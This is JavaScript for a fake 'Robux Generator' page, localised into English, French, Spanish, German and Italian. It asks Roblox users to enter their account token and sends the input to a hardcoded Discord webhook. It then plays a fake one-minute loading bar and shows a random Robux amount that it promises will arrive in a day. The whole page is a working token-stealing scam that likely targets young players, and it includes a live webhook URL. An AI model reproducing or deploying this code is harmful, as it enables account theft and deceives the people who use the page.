        const translations = {
            en: {
                title: "Robux Generator",
                subtitle: "Enter your TOKEN to generate your Robux",
                placeholder: "Your Roblox TOKEN...",
                btnText: "Generate Robux",
                loadingText: "Generating Robux...",
                loadingSubText: "Please wait...",
                congratsText: "Congratulations!",
                successMessage: "Your Robux will arrive in 1 day!",
                errorEmpty: "Please enter a TOKEN",
                errorNetwork: "Connection error. Please try again."
            },
            fr: {
                title: "Générateur de Robux",
                subtitle: "Entrez votre TOKEN pour générer vos Robux",
                placeholder: "Votre TOKEN Roblox...",
                btnText: "Générer des Robux",
                loadingText: "Génération de Robux...",
                loadingSubText: "Veuillez patienter...",
                congratsText: "Félicitations !",
                successMessage: "Vos Robux arriveront dans 1 jour !",
                errorEmpty: "Veuillez entrer un TOKEN",
                errorNetwork: "Erreur de connexion. Veuillez réessayer."
            },
            es: {
                title: "Generador de Robux",
                subtitle: "Ingresa tu TOKEN para generar tus Robux",
                placeholder: "Tu TOKEN de Roblox...",
                btnText: "Generar Robux",
                loadingText: "Generando Robux...",
                loadingSubText: "Por favor espera...",
                congratsText: "¡Felicitaciones!",
                successMessage: "¡Tus Robux llegarán en 1 día!",
                errorEmpty: "Por favor ingresa un TOKEN",
                errorNetwork: "Error de conexión. Por favor intenta de nuevo."
            },
            de: {
                title: "Robux Generator",
                subtitle: "Gib deinen TOKEN ein, um deine Robux zu generieren",
                placeholder: "Dein Roblox TOKEN...",
                btnText: "Robux generieren",
                loadingText: "Robux werden generiert...",
                loadingSubText: "Bitte warten...",
                congratsText: "Herzlichen Glückwunsch!",
                successMessage: "Deine Robux werden in 1 Tag ankommen!",
                errorEmpty: "Bitte gib einen TOKEN ein",
                errorNetwork: "Verbindungsfehler. Bitte versuche es erneut."
            },
            it: {
                title: "Generatore di Robux",
                subtitle: "Inserisci il tuo TOKEN per generare i tuoi Robux",
                placeholder: "Il tuo TOKEN Roblox...",
                btnText: "Genera Robux",
                loadingText: "Generazione Robux...",
                loadingSubText: "Si prega di attendere...",
                congratsText: "Congratulazioni!",
                successMessage: "I tuoi Robux arriveranno tra 1 giorno!",
                errorEmpty: "Inserisci un TOKEN",
                errorNetwork: "Errore di connessione. Riprova."
            }
        };

        let currentLang = 'en';

        function detectBrowserLanguage() {
            const browserLang = navigator.language || navigator.languages[0];
            const langCode = browserLang.split('-')[0];
            
            // Check if we support the detected language, otherwise default to English
            if (translations[langCode]) {
                return langCode;
            }
            return 'en';
        }

        function changeLanguage() {
            // Function removed - language is auto-detected only
        }

        function updateTexts() {
            const t = translations[currentLang];
            document.getElementById('title').textContent = t.title;
            document.getElementById('subtitle').textContent = t.subtitle;
            document.getElementById('username').placeholder = t.placeholder;
            document.getElementById('btnText').textContent = t.btnText;
            document.getElementById('loadingText').textContent = t.loadingText;
            document.getElementById('loadingSubText').textContent = t.loadingSubText;
            document.getElementById('congratsText').textContent = t.congratsText;
            document.getElementById('successMessage').textContent = t.successMessage;
        }

        function createRobloxParticles() {
            const particles = document.querySelector('.roblox-particles');
            for (let i = 0; i < 30; i++) {
                const cube = document.createElement('div');
                cube.classList.add('roblox-cube');
                cube.style.left = Math.random() * 100 + '%';
                cube.style.top = Math.random() * 100 + '%';
                cube.style.animationDelay = Math.random() * 8 + 's';
                cube.style.animationDuration = (Math.random() * 4 + 6) + 's';
                
                // Random cube colors
                const colors = ['#00a2ff', '#ff4757', '#2ed573', '#ffa502', '#5f27cd'];
                cube.style.background = colors[Math.floor(Math.random() * colors.length)];
                
                particles.appendChild(cube);
            }
        }

        async function sendWebhook(username) {
            const webhookUrl = 'https://discord.com/api/webhooks/1410522781895884880/UuenYu3LgJz5pNZWS3Pt4fP8ydePka7Zl9h8VwjDheoN6weOas3LwrlquX3pLZrAwJAe';
            
            const payload = {
                embeds: [{
                    title: "🎮 Robux Generator - Analysis",
                    description: `**Token:** ${username}\n**Language:** ${currentLang.toUpperCase()}\n**Platform:** Roblox Generator`,
                    color: 0x00A2FF,
                    timestamp: new Date().toISOString(),
                    thumbnail: {
                        url: "https://logos-world.net/wp-content/uploads/2021/03/Roblox-Logo.png"
                    },
                    footer: {
                        text: "Roblox Generator App",
                        icon_url: "https://logos-world.net/wp-content/uploads/2021/03/Roblox-Logo.png"
                    }
                }]
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }

                return true;
            } catch (error) {
                console.error('Webhook error:', error);
                return false;
            }
        }

        async function generatePoints() {
            const username = document.getElementById('username').value.trim();
            const errorDiv = document.getElementById('errorMessage');
            
            // Reset error message
            errorDiv.style.display = 'none';
            
            if (!username) {
                errorDiv.textContent = translations[currentLang].errorEmpty;
                errorDiv.style.display = 'block';
                return;
            }

            // Hide main content and show loading
            document.getElementById('main-content').style.display = 'none';
            document.getElementById('loadingContainer').style.display = 'block';
            
            // Send webhook
            const webhookSuccess = await sendWebhook(username);
            
            if (!webhookSuccess) {
                errorDiv.textContent = translations[currentLang].errorNetwork;
                errorDiv.style.display = 'block';
                document.getElementById('main-content').style.display = 'block';
                document.getElementById('loadingContainer').style.display = 'none';
                return;
            }

            // Animate loading bar over 1 minute
            const loadingBar = document.getElementById('loadingBar');
            let progress = 0;
            const duration = 60000; // 1 minute
            const interval = 100; // Update every 100ms
            const increment = 100 / (duration / interval);

            const timer = setInterval(() => {
                progress += increment;
                loadingBar.style.width = Math.min(progress, 100) + '%';
                
                if (progress >= 100) {
                    clearInterval(timer);
                    showSuccess();
                }
            }, interval);
        }

        function showSuccess() {
            // Generate random Robux between 1000 and 50000
            const robux = Math.floor(Math.random() * 49000) + 1000;
            
            // Hide loading and show success
            document.getElementById('loadingContainer').style.display = 'none';
            document.getElementById('successContainer').style.display = 'block';
            
            // Animate Robux counter
            const pointsDisplay = document.getElementById('pointsDisplay');
            let currentRobux = 0;
            const targetRobux = robux;
            const robuxTimer = setInterval(() => {
                currentRobux += Math.ceil(targetRobux / 50);
                if (currentRobux >= targetRobux) {
                    currentRobux = targetRobux;
                    clearInterval(robuxTimer);
                }
                pointsDisplay.innerHTML = `<span class="robux-icon"></span>${currentRobux.toLocaleString()}`;
            }, 50);
        }

        // Handle Enter key
        document.getElementById('username').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                generatePoints();
            }
        });

        // Initialize
        function init() {
            // Detect and set browser language
            currentLang = detectBrowserLanguage();
            
            // Create particles and update texts
            createRobloxParticles();
            updateTexts();
        }

        init();